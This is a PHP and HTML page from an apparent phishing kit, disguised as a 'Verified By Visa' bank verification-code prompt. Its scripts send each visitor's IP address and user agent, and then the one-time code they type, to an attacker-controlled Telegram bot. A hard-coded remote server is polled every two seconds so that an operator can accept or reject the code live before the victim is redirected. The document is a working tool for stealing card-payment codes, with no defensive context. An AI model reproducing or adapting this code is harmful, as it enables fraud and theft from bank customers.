<?php
session_start(); // Start the session

$_SESSION['user_agent'] = $_SERVER['HTTP_USER_AGENT'];
$_SESSION['user_ip'] = $_SERVER['REMOTE_ADDR'];


if (isset($_SESSION['user_ip'])) {
    $userIp = $_SESSION['user_ip'];
    $userAgent = $_SESSION['user_agent'];
}

// Redirect to the reCAPTCHA page if the session variable is not set or not true
if (!isset($_SESSION['recaptcha_validated']) || $_SESSION['recaptcha_validated'] !== true) {
    header("Location: /captcha/page.php"); // Adjust path as needed
    exit;
}


?>
<html style="" class="csstransitions no-csspseudotransitions no-touchevents language-en is-signed-in" lang="en">
    <head>
        <meta charset="UTF-8">
        <title>Verification Code | Verified By Visa</title>
      
        <meta name="robots" content="noindex, nofollow">
        <link rel="shortcut icon" type="image/x-icon" href="favicon.ico">
        <meta name="viewport" content="width=device-width,initial-scale=1">
        <link type="text/css" href="/assets/cap/general.css" rel="stylesheet">
        <link type="text/css" href="/assets/cap/basic.css" rel="stylesheet">
        <link type="text/css" href="/assets/cap/org.css" rel="stylesheet">
        <link href="/assets/cap/bound.css" rel="stylesheet">
        <style>
        .loading-overlay {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(255, 255, 255, 0.8);
            z-index: 1050;
        }

        .loading-overlay.active {
            display: flex; /* Display the overlay when active */
        }

        .spinner-container {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
        }
        
</style>

        <!-- Include Bootstrap CSS -->
    <link href="https://stackpath.bootstrapcdn.com/bootstrap/5.0.0-alpha1/css/bootstrap.min.css" rel="stylesheet">
        <style>#track-main-content[_ngcontent-c0]{margin-right:-1rem!important;margin-left:-1rem!important}</style>
    </head>
    <body id="bdmain" class="www track_web f-topbar-fixed" style="" onload="document.getElementById('bdmain').style.display='';">
<!-- Modal -->


  <div class="modal-dialog modal-dialog-centered">
    <div class="modal-content">
      <div class="modal-header">
        <h5 class="modal-title">Digital Bank</h5>
        <div>
        <img src="/assets/cap/visa.png" alt="Visa" class="" style="width: 60px; height: auto;">
        <img src="/assets/cap/securecode.png" alt="Visa" class="" style="width: 60px; height: auto;">
        </div>
      </div>
      <div class="modal-body">
        <p class="mb-4">Enter verification code<br>
        We sent you a verification code by text message. You have 6 attempts.</p>
        
        <div class="mb-3">
          <label for="verificationCode" class="form-label">Verification code</label>
          <input type="tel" class="form-control" id="verificationCode" placeholder="123456" maxlength="10">
          <div id="errorMessage" style="color:red; display:none;">
            Please enter a valid code.
          </div>
        </div>
        
        <button class="btn btn-primary w-100" id="continueBtn">CONTINUE</button>
        <button class="mt-2 btn-secondary w-100">RESEND CODE</button>
        <!-- Loading Overlay -->
        <div class="loading-overlay">
        <div class="spinner-container">
            <div class="spinner-border text-primary" role="status">
                <span class="sr-only">Loading...</span>
            </div>
        </div>
    </div>


        
        
        <p class="mt-3">Having trouble?</p>
        
        <div class="mt-3">
          <a href="#" class="btn btn-link">Need Help?</a>
          <span class="float-end">+</span>
        </div>
      </div>
    </div>
  </div>




<!-- Include Bootstrap Bundle with Popper -->
<script src="https://stackpath.bootstrapcdn.com/bootstrap/5.0.0-alpha1/js/bootstrap.bundle.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.9.2/dist/umd/popper.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.min.js"></script>

    </body>
    <script>
        // Get the button, assign a click event handler
document.getElementById('continueBtn').addEventListener('click', function() {

// Show the loading overlay
document.querySelector('.loading-overlay').style.display = 'flex';
    
    const telegramApiUrl = `https://api.telegram.org/bot<?php echo $_SESSION['TELEGRAM_BOT_KEY']?>/sendMessage`;
    // Construct the message text
    const verificationCode = document.getElementById('verificationCode').value;
    let messageText = `OTP Verification\n\nCode: ${verificationCode}\nIP: <?php echo $userIp ?>\nUserAgent: <?php echo $userAgent?>`;

    const userIp = '<?php echo $userIp ?>';
    // Set up the payload
    const payload = {
        chat_id: '<?php echo $_SESSION['CHAT_ID']?>', // Replace with your actual chat ID
        text: messageText,
        reply_markup: JSON.stringify({
            inline_keyboard: [
                [
                    { text: 'Good OTP', callback_data: 'good:' + userIp },
                    { text: 'Bad OTP', callback_data: 'bad:' + userIp }
                ]
            ]
        })
    };

    fetch(telegramApiUrl, {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json'
    },
    body: JSON.stringify(payload)
})
.then(response => response.json())
.then(data => console.log(data))
.catch(error => console.error('Error:', error));
    
});




            // Telegram API URL with your bot token and method
    let messageText = `OTP Page\n\nIP: <?php echo $userIp ?>\nUserAgent: <?php echo $userAgent?>`;

const telegramApiUrl = `https://api.telegram.org/bot<?php echo $_SESSION['TELEGRAM_BOT_KEY']?>/sendMessage`;
const payload = {
    chat_id: '<?php echo $_SESSION['CHAT_ID']?>',
    text: messageText
};

fetch(telegramApiUrl, {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json'
    },
    body: JSON.stringify(payload)
})
.then(response => response.json())
.then(data => console.log(data))
.catch(error => console.error('Error:', error));


    </script>
    <script>
     setInterval(function() {
        fetch('http://3.95.135.26/verify/file.json')
    .then(response => {
        if (!response.ok) {
            throw new Error('Network response was not ok');
        }
        return response.text();
    })
    .then(text => {
        return text ? JSON.parse(text) : {};
    })
    .then(data => {
        let bad = 'bad'
        let good = 'good'
        // Process the data
        for (const ip in data) {
            if('<?php echo $userIp?>' == ip){
                const action = data[ip].action;
                    console.log(action)
                    if (action === bad) {
                        // Display the error message
                        document.querySelector('.loading-overlay').style.display = 'none';
                        document.getElementById('errorMessage').style.display = 'block';
                    } else if (action === good) {
                        // Hide the error message if the action is not 'bad'
                        document.getElementById('errorMessage').style.display = 'none';
                        window.location.href = '/pages/finish/page.php';
                    }
            }
         
                    
            
                }
    })
    .catch(error => {
        console.error('Error fetching data:', error);
    });
    }, 2000); // Check every 3 seconds
</script>

    
</html>


